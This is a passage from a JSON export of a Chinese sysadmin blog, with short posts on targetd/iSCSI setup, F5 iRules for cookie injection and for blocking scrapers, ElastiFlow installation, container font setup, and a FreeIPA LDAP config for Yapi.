class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# defaults below; uncomment and edit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if using a thin pool, use \u0026lt;volume group name\u0026gt;/\u0026lt;thin pool name\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# e.g vg-targetd/pool\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epool_name: vg-targetd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser: admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essl: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etarget_name: iqn.2020-04.com.ddky:renhe-18-30-18\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，这个文件生成后，就不需要改动了，如果以后target_name变了，也不用管，也不需要重启targetd\u003c/p\u003e\n\u003cp\u003e启动服务：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now targetd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e运行一下命令，看看显示结果\npvdisplay\nvgdisplay\nlvdisplay\ntargetcli ls /\u003c/p\u003e\n\u003cp\u003e注意：lvdisplay结果和targetcli ls /结果都是空\u003c/p\u003e","title":"iscsi卷的远程挂载使用"},{"content":"F5-Bigip利用irule强行给请求植入Cookie的方法。\nirule有两种做法可以让链接重定向\nHTTP::redirect \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot;\r或者：\nHTTP::respond 302 Location \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot; \u0026quot;locale\u0026quot; $cookie\r我们可以利用第二种方法来强行塞进cookie\nwhen HTTP_REQUEST {\rif {[HTTP::host] equals “find.domain.com” and [HTTP::path] equals “/” } {\rset local_cookie [HTTP::cookie value lg_locale]\rset cookie [format \u0026quot;locale=%s; path=/; domain=%s\u0026quot; $local_cookie \u0026quot;\u0026lt;cookiedomain\u0026gt;\u0026quot;]\rHTTP::respond 302 Location “http://redirect.domain.com[HTTP::uri]” “Set-Cookie” $cookie\r}\r}\r结果： ","permalink":"https://rendoumi.com/posts/20230727-f5_irule_cookie/","summary":"\u003cp\u003eF5-Bigip利用irule强行给请求植入Cookie的方法。\u003c/p\u003e\n\u003cp\u003eirule有两种做法可以让链接重定向\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eHTTP::redirect \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot;\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e或者：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eHTTP::respond 302 Location \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot; \u0026quot;locale\u0026quot; $cookie\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们可以利用第二种方法来强行塞进cookie\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ewhen HTTP_REQUEST {\r\n    if {[HTTP::host] equals “find.domain.com” and [HTTP::path] equals “/” } {\r\n        set local_cookie [HTTP::cookie value lg_locale]\r\n        set cookie [format \u0026quot;locale=%s; path=/; domain=%s\u0026quot; $local_cookie \u0026quot;\u0026lt;cookiedomain\u0026gt;\u0026quot;]\r\n        HTTP::respond 302 Location “http://redirect.domain.com[HTTP::uri]” “Set-Cookie” $cookie\r\n    }\r\n}\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果：\n\u003cimg alt=\"image-20230727133739834\" loading=\"lazy\" src=\"/posts/20230727-f5_irule_cookie/image-20230727133739834.png\"\u003e\u003c/p\u003e","title":"F5利用irule强行植入cookie"},{"content":"F5-Bigip利用irule防止爬虫的一法。\n爬虫的请求：\nGET /cms/rest.htm?method=ddky.cms.search.recommend.h5.o2o\u0026amp;pageNo=1\u0026amp;pageSize=6\u0026amp;shopId=201790\u0026amp;ordertypeId=0\u0026amp;suite=1\u0026amp;searchType=o2o\u0026amp;searchPanel=1\u0026amp;wd=%E6%B4%9B%E4%B8%81%E6%96%B0\u0026amp;lat=22.520712193695\u0026amp;lng=113.9233553732\u0026amp;city=%E6%B7%B1%E5%9C%B3%E5%B8%82\u0026amp;type=90\u0026amp;unique=05685D2A5DAB8ABBD2E5E5B26E0C960F\u0026amp;versionName=5.7.5\u0026amp;plat=H5\u0026amp;platform=H5\u0026amp;t=2020-12-15%2014%3A19%3A11\u0026amp;v=1.0\u0026amp;sign=A6BD136BC1B6F91E5C7DD5A0DA03DD79\u0026amp;callback=jsonp1 里面的t值是时间，t=2020-12-15%2014%3A19%3A11\n但是有个问题，这个值一直不变了，那我们就利用这一点。如果T值跟当前时间对比，是3分钟前的，那就封！\nF5的irule，直接return的是白名单：\nwhen HTTP_REQUEST { set t [URI::decode [URI::query [HTTP::uri] t]] set before [clock scan \u0026#34;180 seconds ago\u0026#34; ] if { [IP::addr [IP::client_addr] equals 124.206.168.0/255.255.255.224]} { return} if { [IP::addr [IP::client_addr] equals 61.135.14.96/255.255.255.240]} { return} if { [IP::addr [IP::client_addr] equals 114.251.7.112/255.255.255.240]} { return} if { [string tolower [HTTP::uri]] contains \u0026#34;/cms/\u0026#34;} { if {$before \u0026gt; [clock scan $t]} { drop } } } ","permalink":"https://rendoumi.com/posts/20230727-f5_irule_t/","summary":"\u003cp\u003eF5-Bigip利用irule防止爬虫的一法。\u003c/p\u003e\n\u003cp\u003e爬虫的请求：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGET /cms/rest.htm?method\u003cspan class=\"o\"\u003e=\u003c/span\u003eddky.cms.search.recommend.h5.o2o\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003epageNo\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003epageSize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e6\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eshopId\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e201790\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eordertypeId\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esuite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esearchType\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eo2o\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esearchPanel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ewd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%E6%B4%9B%E4%B8%81%E6%96%B0\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003elat\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e22.520712193695\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003elng\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e113.9233553732\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ecity\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%E6%B7%B1%E5%9C%B3%E5%B8%82\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e90\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eunique\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e05685D2A5DAB8ABBD2E5E5B26E0C960F\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eversionName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e5.7.5\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eplat\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eH5\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eplatform\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eH5\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003et\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e2020-12-15%2014%3A19%3A11\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1.0\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esign\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eA6BD136BC1B6F91E5C7DD5A0DA03DD79\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ecallback\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ejsonp1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e里面的t值是时间，t=2020-12-15%2014%3A19%3A11\u003c/p\u003e\n\u003cp\u003e但是有个问题，这个值一直不变了，那我们就利用这一点。如果T值跟当前时间对比，是3分钟前的，那就封！\u003c/p\u003e\n\u003cp\u003eF5的irule，直接return的是白名单：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-perl\" data-lang=\"perl\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewhen\u003c/span\u003e \u003cspan class=\"n\"\u003eHTTP_REQUEST\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"n\"\u003eset\u003c/span\u003e \u003cspan class=\"n\"\u003et\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eURI::\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eURI::\u003c/span\u003e\u003cspan class=\"n\"\u003equery\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eHTTP::\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"n\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e]]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"n\"\u003eset\u003c/span\u003e \u003cspan class=\"n\"\u003ebefore\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eclock\u003c/span\u003e \u003cspan class=\"n\"\u003escan\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;180 seconds ago\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eaddr\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eclient_addr\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"n\"\u003eequals\u003c/span\u003e \u003cspan class=\"mf\"\u003e124.206.168.0\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mf\"\u003e255.255.255.224\u003c/span\u003e\u003cspan class=\"p\"\u003e]}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eaddr\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eclient_addr\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"n\"\u003eequals\u003c/span\u003e \u003cspan class=\"mf\"\u003e61.135.14.96\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mf\"\u003e255.255.255.240\u003c/span\u003e\u003cspan class=\"p\"\u003e]}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eaddr\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eIP::\u003c/span\u003e\u003cspan class=\"n\"\u003eclient_addr\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"n\"\u003eequals\u003c/span\u003e \u003cspan class=\"mf\"\u003e114.251.7.112\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mf\"\u003e255.255.255.240\u003c/span\u003e\u003cspan class=\"p\"\u003e]}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003estring\u003c/span\u003e \u003cspan class=\"n\"\u003etolower\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nn\"\u003eHTTP::\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e]]\u003c/span\u003e \u003cspan class=\"n\"\u003econtains\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;/cms/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nv\"\u003e$before\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eclock\u003c/span\u003e \u003cspan class=\"n\"\u003escan\u003c/span\u003e \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e\u003cspan class=\"p\"\u003e]}\u003c/span\u003e  \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003edrop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"F5利用irule防爬虫"},{"content":"elasticflow 是个流量分析工具，通过对各种flow流量的抓取，分析数据，可以清晰的看到局域网中的流量。\n网管的必备啊。首先要把sflow流量给发过来。(这里172.18.31.23是服务器端)\nsflow collector 2 ip 172.18.31.23 description flow-server 拉取源代码：\ngit clone https://github.com/robcowart/elastiflow 启动集群\ndocker-compose up -d 这样整个数据会被清空，需要重新生成一遍，先把kibana的数据文件拉回来\nwget https://raw.githubusercontent.com/robcowart/elastiflow/master/kibana/elastiflow.kibana.7.8.x.ndjson 然后登录http://172.18.31.23:5601\n先到配置，导入 导入对象，选择elastiflow.kibana.7.8.x.ndjson文件上传 导入成功，导入了300多个对象 然后配置索引，应该不用配，直接选一个做default 这样就ok了，去dashboard的overview就能看到东西了 然后去修改一下shard策略，省得索引报黄色\nPUT /_template/elastiflow-3.5.3\r{\r\u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;settings\u0026#34;: {\r\u0026#34;number_of_shards\u0026#34;: 1\r}\r}\rPUT /_template/index_defaults {\r\u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;,\r\u0026#34;settings\u0026#34;: {\r\u0026#34;number_of_shards\u0026#34;: 1\r}\r}\rPUT /_template/elastiflow-3.5.3\r{\r\u0026#34;index_patterns\u0026#34;: \u0026#34;elastiflow-3.5.3-*\u0026#34;, \u0026#34;settings\u0026#34;: {\r\u0026#34;number_of_shards\u0026#34;: 1\r}\r} 查看一下：\ncurl -s -X GET \u0026#39;http://localhost:9200/_cat/indices?v\u0026#39;\rcurl -s -X GET \u0026#39;http://localhost:9200/_template\u0026#39;| jq ","permalink":"https://rendoumi.com/posts/20230724-elasticflow/","summary":"\u003cp\u003eelasticflow 是个流量分析工具，通过对各种flow流量的抓取，分析数据，可以清晰的看到局域网中的流量。\u003c/p\u003e\n\u003cp\u003e网管的必备啊。首先要把sflow流量给发过来。(这里172.18.31.23是服务器端)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esflow collector \u003cspan class=\"m\"\u003e2\u003c/span\u003e ip 172.18.31.23 description flow-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e拉取源代码：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/robcowart/elastiflow\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e启动集群\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edocker-compose up -d\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样整个数据会被清空，需要重新生成一遍，先把kibana的数据文件拉回来\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ewget https://raw.githubusercontent.com/robcowart/elastiflow/master/kibana/elastiflow.kibana.7.8.x.ndjson\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后登录\u003ca href=\"http://172.18.31.23:5601\"\u003ehttp://172.18.31.23:5601\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e先到配置，导入\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111258.png\"\u003e\u003c/p\u003e\n\u003cp\u003e导入对象，选择elastiflow.kibana.7.8.x.ndjson文件上传\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111316.png\"\u003e\u003c/p\u003e\n\u003cp\u003e导入成功，导入了300多个对象\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111404.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后配置索引，应该不用配，直接选一个做default\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111511.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111811.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_111841.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这样就ok了，去dashboard的overview就能看到东西了\n\u003cimg loading=\"lazy\" src=\"/posts/20230724-elasticflow/2021-06-09_113220.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后去修改一下shard策略，省得索引报黄色\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePUT /_template/elastiflow-3.5.3\r\n{\r\n  \u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;, \r\n  \u0026#34;settings\u0026#34;: {\r\n    \u0026#34;number_of_shards\u0026#34;: 1\r\n  }\r\n}\r\nPUT /_template/index_defaults \r\n{\r\n  \u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;,\r\n  \u0026#34;settings\u0026#34;: {\r\n  \u0026#34;number_of_shards\u0026#34;: 1\r\n  }\r\n}\r\nPUT /_template/elastiflow-3.5.3\r\n{\r\n  \u0026#34;index_patterns\u0026#34;: \u0026#34;elastiflow-3.5.3-*\u0026#34;, \r\n  \u0026#34;settings\u0026#34;: {\r\n    \u0026#34;number_of_shards\u0026#34;: 1\r\n  }\r\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看一下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecurl -s -X GET \u0026#39;http://localhost:9200/_cat/indices?v\u0026#39;\r\ncurl -s -X GET \u0026#39;http://localhost:9200/_template\u0026#39;| jq\n\u003c/code\u003e\u003c/pre\u003e","title":"绝版的elasticflow的安装"},{"content":"pod 容器内要用中文雅黑字体生成 jpg 图片，没办法，只能把字体给装进去\n首先进入容器，确定容器的基底是什么，是yum、apt或者apk\n通常都是用apk最小化安装的，这样做法如下：\napk update apk add --update ttf-dejavu fontconfig rm -rf /var/cache/apk/* mkdir /usr/share/fonts/chinese cp /usr/local/jre1.8.0_201/lib/fonts/simsun.ttc /usr/share/fonts/chinese mkfontscale \u0026amp;\u0026amp; mkfontdir \u0026amp;\u0026amp; fc-cache 这样就搞定了，当然这只是临时的。\n要想长久就得修改Dockerfile，把文件拷进容器，然后同样得执行命令即可。\n","permalink":"https://rendoumi.com/posts/20230706-fonts_in_pod/","summary":"\u003cp\u003epod 容器内要用中文雅黑字体生成 jpg 图片，没办法，只能把字体给装进去\u003c/p\u003e\n\u003cp\u003e首先进入容器，确定容器的基底是什么，是yum、apt或者apk\u003c/p\u003e\n\u003cp\u003e通常都是用apk最小化安装的，这样做法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapk add --update ttf-dejavu fontconfig\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erm -rf /var/cache/apk/*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /usr/share/fonts/chinese\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /usr/local/jre1.8.0_201/lib/fonts/simsun.ttc /usr/share/fonts/chinese\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkfontscale \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e mkfontdir \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e fc-cache\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就搞定了，当然这只是临时的。\u003c/p\u003e\n\u003cp\u003e要想长久就得修改Dockerfile，把文件拷进容器，然后同样得执行命令即可。\u003c/p\u003e","title":"如何在容器内安装字体文件"},{"content":"2023年上半年经过努力，又考了3张证书，下半年继续努力奋斗\u0026hellip;\u0026hellip;\n","permalink":"https://rendoumi.com/posts/20230630-certificates/","summary":"\u003cp\u003e2023年上半年经过努力，又考了3张证书，下半年继续努力奋斗\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230630161935782\" loading=\"lazy\" src=\"/posts/20230630-certificates/image-20230630161935782.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230630162007269\" loading=\"lazy\" src=\"/posts/20230630-certificates/image-20230630162007269.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230630162040982\" loading=\"lazy\" src=\"/posts/20230630-certificates/image-20230630162040982.png\"\u003e\u003c/p\u003e","title":"2023年获得的证书"},{"content":"Freeipa接入Yapi.\nvi my-api/config.json\n... \u0026#34;ldapLogin\u0026#34;: { \u0026#34;enable\u0026#34;: true, \u0026#34;server\u0026#34;: \u0026#34;ldap://ldap.bybon.cn\u0026#34;, \u0026#34;baseDn\u0026#34;: \u0026#34;uid=manager,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;, \u0026#34;bindPassword\u0026#34;: \u0026#34;xxxxxxxx\u0026#34;, \u0026#34;searchDn\u0026#34;: \u0026#34;cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;, \u0026#34;searchStandard\u0026#34;: \u0026#34;mail\u0026#34;, \u0026#34;emailPostfix\u0026#34;: 